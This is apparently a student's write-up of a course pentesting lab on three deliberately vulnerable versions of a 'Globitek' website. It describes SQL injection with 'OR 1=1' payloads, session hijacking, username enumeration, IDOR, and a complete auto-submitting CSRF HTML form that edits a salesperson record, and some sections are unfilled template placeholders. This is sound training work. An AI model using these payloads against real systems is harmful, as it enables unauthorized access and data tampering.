# Project 8 - Pentesting Live Targets

Time spent: **X** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:

* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each color is vulnerable to only 2 of the 6 possible exploits. First discover which color has the specific vulnerability, then write a short description of how to exploit it, and finally demonstrate it using screenshots compiled into a GIF.

## Blue

Vulnerability #1: SQL Injection 

Description:

The salesperson page is not properly sanitizing queries (``` https://104.198.208.81/blue/public/staff/salespeople/show.php?id=5 ```). If you input an invalid query (syntax-wise), we will notice that we are redirected to an error explaining our query failed stating that the "Database query failed." (Query attempted: ``` 'OR 1=1' ```). We can use this newfound knowledge to help us realize our query is actually being recognized. So, for example, by injecting a SQL query: ``` 'OR 1=1--' ```. We can then note that our query is injected, changing the salesperson.

<img src="blue-vuln1.gif">

Vulnerability #2: Session Hijacking

Description:

If a non-user gets access to a session id of one that is a user, they can then modify the session id which will automatically sign them on as the user, thus allowing them access as that user to modify/change data as they wish. 

For example in the gif below, after setting the session id of the different browser to that from the other browser (logged in), after pressing log in, we are automatically logged in, bypassing needing to enter login.


<img src="blue-vuln2.gif">

## Green

Vulnerability #1: Username enumeration

Description:
There is a slight change in how errors are displayed depending on the user. If the user exists (and the password is wrong) the error is bolded. However, using a nonexistant user will show an unbolded error.

For the demonstration, we will use the username "jmonroe99." It is an existing user and we will modify it to become "jmonroe9" (a nonexisting user). Other pages do not have this issue (used red site as a demonstration that it's bolded in both instances).

<img src="green-vuln1.gif">

Vulnerability #2: __________________

Description:

<img src="green-vuln2.gif">


## Red

Vulnerability #1: Insecure Direct Object Reference

Description:

A visitor (does not need to be a user) can view other or previous salepersons that should not be visible to the user on the red page by modifying the id to a different number (like id = 10 or id = 11). The other sites prevent this issue and will not load such values.

<img src="red-vuln1.gif">
**(See red-vuln1.gif For a bigger view of the gif)**

Vulnerability #2: Cross-Site Request Forgery

Description:

We can submit feedback with malicious html that can load to modify values when the admin opens it. For example, I used Etam4225.github.io to demonstrate where my html code are automatically run onload of the page using the code: 
``` 
<!DOCTYPE html>
<html>
<body onload = "hiddenForm.submit()">
	<form name = "hiddenForm" action = "https://104.198.208.81/red/public/staff/salespeople/edit.php?id=7" method = "POST">
		<input type = "hidden" name = "first_name" value = "Samuelant">
		<input type = "hidden" name = "last_name" value = "isTotallyARealName">
		<input type="hidden" name="phone" value="999-999-9999">
		<input type="hidden" name="email" value="shunter@salesperson.com">
	</form>
</body>
</html>
 ```
 Here, I modified the first_name, last_name, and phone # of the user of id=7 (Originally Samuel Hunter)

<img src="red-vuln2.gif">


## Notes

Describe any challenges encountered while doing the work
